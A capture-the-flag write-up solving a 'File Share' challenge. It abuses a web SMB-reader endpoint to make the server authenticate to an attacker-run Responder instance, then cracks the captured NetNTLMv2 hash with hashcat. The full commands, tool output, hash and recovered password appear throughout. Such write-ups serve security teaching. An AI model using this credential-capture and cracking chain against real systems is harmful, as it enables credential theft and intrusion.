# File Share (4 Points)
> Hi Expert,
> 
> the file sharing service at http://78.128.216.5:65080 looks as valuable source of  information. Get access to the system and export any valuable data.

> HINT: Check also other services on given server 78.128.216.5.

## Introduction
First things first, lets check what is running on that link. Visiting `http://78.128.216.5:65080` redirects us to `/smbreader?server=localhost&file=message.txt` with response of:

```
Current path is \\localhost\shared\message.txt
Hey you, try to get Samba password for user 'shared', then search flag.txt  :-)
```

Interesting, there is apparently some `smbreader` gadget. This is a reference to Server Message Block protocol - SMB. 

```
SMB Protocol Prefix
 |     Host
 |     |      SMB Share
 |     |      |          File
 |     |      |          |
 v     v      v          v
\\localhost\shared\message.txt
```

However trying `/smbreader?server=localhost&file=flag.txt` expectedly does not work. Since there is also `server` parameter, it looks like we can use it to read samba shares from arbitrary host.

## Other services
Lets do a nmap scan to see what else is running on that host
```
nmap -sV -sC 78.128.216.5
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-17 14:12 CEST
Nmap scan report for 78.128.216.5
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: 1B3B795A8C43

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: 1b3b795a8c43
|   NetBIOS computer name: 1B3B795A8C43\x00
|   Domain name: \x00
|   FQDN: 1b3b795a8c43
|_  System time: 2021-10-17T12:13:18+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-17T12:13:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.86 seconds
```

We see that there are two services running:

1. Port 139 - Older SMB on top of NetBIOS
2. Port 445 - Newer SMB over TCP


Maybe the share is not password protected? Lets try to access the share
```
smbclient \\\\78.128.216.5\\shared -U shared 
Enter WORKGROUP\shared's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

No luck here, that means we need to somehow get the password to the share.


## Exploitation
Since reading the file works in the web app, it must be doing an authenticated request. We can supply arbitrary host to read the file from, thus most likely using the same credentials there. What if we could create a malicious SMB server that would look and act like a normal SMB server, however its only interest will be stealing the login credentials?

`Responder` is a tool doing exactly this. For this we will also need some server, I used a cloud VM and allowed ports 139 and 445 as inbound connections in firewall. Then I downloaded Responder from [here](https://github.com/lgandx/Responder), edited the configuration file, `Responder.conf` to only enable SMB protocol, and ran Responder with 

```py
python Responder.py -I <interface name>
```

Now we can navigate to http://78.128.216.5:65080/smbreader?server=ip_of_our_VM&file=message.txt, and in our Responder window, we should see the intercepted authentication hash.

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C


[+] Poisoners:
    LLMNR                      [OFF]
    NBT-NS                     [OFF]
    DNS/MDNS                   [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [OFF]
    SQL server                 [OFF]
    FTP server                 [OFF]
    IMAP server                [OFF]
    POP3 server                [OFF]
    SMTP server                [OFF]
    DNS server                 [OFF]
    LDAP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]


[+] Listening for events...
[SMB] NTLMv2-SSP Client   : x.x.x.x
[SMB] NTLMv2-SSP Username : \shared
[SMB] NTLMv2-SSP Hash     : shared:::207d6e8a88c1e02a:71F4A50A3767EB17955A940F661822D4:0101000000000000008547DC98D0D7017D18291089FFC6820000000002000800430050003800500001001E00570049004E002D0044003600500039004D00370032004C004E003000560004003400570049004E002D0044003600500039004D00370032004C004E00300056002E0043005000380050002E004C004F00430041004C000300140043005000380050002E004C004F00430041004C000500140043005000380050002E004C004F00430041004C0007000800008547DC98D0D7010900240043004900460053002F00330035002E003200300034002E00370037002E0032003200320006000400020000000000000000000000
```

## Cracking the hash
I used hashcat to crack the NTLMv2 hash (rockyou.txt wordlist), as it supports GPU and its much faster than JtR. Mode 5600 stands for `NetNTLMv2`

```
>> hashcat --help | grep 5600
   5600 | NetNTLMv2                                        | Network Protocols
```

```
>> hashcat -m 5600 hash rockyou.txt

SHARED:::207d6e8a88c1e02a:71f4a50a3767eb17955a940f661822d4:0101000000000000008547dc98d0d7017d18291089ffc6820000000002000800430050003800500001001e00570049004e002d0044003600500039004d00370032004c004e003000560004003400570049004e002d0044003600500039004d00370032004c004e00300056002e0043005000380050002e004c004f00430041004c000300140043005000380050002e004c004f00430041004c000500140043005000380050002e004c004f00430041004c0007000800008547dc98d0d7010900240043004900460053002f00330035002e003200300034002e00370037002e0032003200320006000400020000000000000000000000:Iloveyou4
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: SHARED:::207d6e8a88c1e02a:71f4a50a3767eb17955a940f6...000000
Time.Started.....: Fri Nov  5 11:04:03 2021 (1 sec)
Time.Estimated...: Fri Nov  5 11:04:04 2021 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 19096.7 kH/s (9.22ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 393216/14344384 (2.74%)
Rejected.........: 0/393216 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> remmer
Hardware.Mon.#1..: Temp: 63c Util: 32% Core:1708MHz Mem:3504MHz Bus:16

Started: Fri Nov  5 11:04:03 2021
Stopped: Fri Nov  5 11:04:04 2021
```

The correct password is `Iloveyou4`, now we can use any smb client to connect to the share and have a look around. There is a file `flag.txt` containing the flag.
